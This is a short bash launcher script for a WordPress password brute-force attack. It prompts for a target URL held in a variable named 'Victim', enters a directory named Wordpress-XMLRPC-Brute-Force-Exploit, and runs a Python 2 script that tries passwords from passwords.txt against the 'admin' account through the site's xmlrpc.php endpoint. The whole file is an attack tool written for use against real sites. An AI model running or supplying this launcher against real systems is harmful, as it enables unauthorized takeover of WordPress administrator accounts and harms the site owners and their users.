#!/bin/bash
echo -ne "[+] Enter Absolute Url : "
read Victim
cd Wordpress-XMLRPC-Brute-Force-Exploit
python2 wordpress-xmlrpc-brute-v1.py $Victim/xmlrpc.php passwords.txt admin
